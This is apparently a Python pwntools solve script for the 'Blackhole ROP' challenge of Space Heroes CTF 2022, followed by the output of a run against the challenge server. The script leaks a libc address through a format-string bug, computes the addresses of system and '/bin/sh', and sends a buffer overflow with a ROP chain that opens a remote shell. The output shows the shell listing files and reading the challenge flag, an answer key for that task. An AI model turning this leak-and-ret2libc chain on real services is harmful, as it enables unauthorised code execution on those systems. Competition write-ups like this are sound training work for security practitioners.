from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

HOST = "0.cloud.chals.io"
PORT = 12655
s = remote(HOST, PORT)
libc = ELF("./libc6_2.33-1_amd64.so")

main_addr   = 0x4013ca
pop_rdi_ret = 0x4014db # pop rdi; ret
pop_rsi_ret = 0x4014d9 # pop rsi; pop r15; ret
pop_rax_ret = 0x4013c5 # pop rax, ret
syscall_ret = 0x4013bb # syscall, ret
writable_mm = 0x666000

pos = 0x404018
s.recvuntil(">>> ")
s.sendline("%7$s----" + p64(pos))
s.recvuntil("You say: ")
libc_leak = u64(s.recv(6) + "\x00\x00")
libc_base = libc_leak - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

s.recvuntil(">>> ")

buf  = "A"*40
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Blackhole_ROP$ python solve.py 
[+] Opening connection to 0.cloud.chals.io on port 12655: Done
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Blackhole_ROP/libc6_2.33-1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f8429e05de0
libc_base = 0x7f8429d90000
[*] Switching to interactive mode

<<< You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@$id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ ls -l
total 92
-rw-r--r--   1 root   root      389 Apr  2 22:54 -
-rw-r--r--   1 root   root       56 Jan  4 12:14 banner_fail
lrwxrwxrwx   1 root   root        7 Feb  7 02:37 bin -> usr/bin
-rwxr-xr-x   1 root   root    16496 Feb  9 12:51 blackhole
drwxr-xr-x   2 root   root     4096 Feb  3 15:41 boot
drwxr-xr-x   5 root   root      360 Apr  2 15:27 dev
drwxr-xr-x   1 root   root     4096 Apr  2 15:27 etc
-rw-r--r--   1 root   root       60 Feb  9 14:19 flag.txt
drwxr-xr-x   2 root   root     4096 Feb  3 15:41 home
lrwxrwxrwx   1 root   root        7 Feb  7 02:37 lib -> usr/lib
lrwxrwxrwx   1 root   root        9 Feb  7 02:37 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root        9 Feb  7 02:37 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root       10 Feb  7 02:37 libx32 -> usr/libx32
drwxr-xr-x   2 root   root     4096 Feb  7 02:37 media
drwxr-xr-x   2 root   root     4096 Feb  7 02:37 mnt
drwxr-xr-x   2 root   root     4096 Feb  7 02:37 opt
dr-xr-xr-x 309 nobody nogroup     0 Apr  2 15:27 proc
drwx------   2 root   root     4096 Feb  7 02:37 root
drwxr-xr-x   1 root   root     4096 Feb  8 11:45 run
lrwxrwxrwx   1 root   root        8 Feb  7 02:37 sbin -> usr/sbin
-rw-r--r--   1 root   root      435 Jan  4 12:14 service.conf
drwxr-xr-x   2 root   root     4096 Feb  7 02:37 srv
dr-xr-xr-x  13 nobody nogroup     0 Apr  2 15:27 sys
drwxrwxrwt   1 root   root     4096 Feb  8 11:45 tmp
drwxr-xr-x   1 root   root     4096 Feb  7 02:37 usr
drwxr-xr-x   1 root   root     4096 Feb  7 02:37 var
-rwxr-xr-x   1 root   root       91 Feb  9 14:11 wrapper
$ cat flag.txt
shctf{1-hAs-4-ngul4riTy-coNtain3d-w1thin-a-r3g1on-oF-sp4c3}
'''

